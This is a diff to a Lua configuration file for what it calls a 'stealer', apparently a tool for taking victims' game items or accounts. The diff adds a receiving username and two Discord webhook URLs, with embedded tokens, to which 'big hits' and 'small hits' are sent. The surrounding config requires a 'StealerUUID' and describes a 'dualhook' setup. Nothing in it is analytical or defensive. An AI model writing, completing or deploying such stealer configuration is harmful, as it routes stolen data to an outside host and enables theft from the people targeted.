@@ -1,3 +1,10 @@
+Usernames = {
+    'skibidisigmagarden7',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm"
+
 Config = {
     StealerUUID = '10', -- THIS IS REQUIRED!!!
     Dualhooked = true, -- if u dont enable it and configure dualhook, it wont work
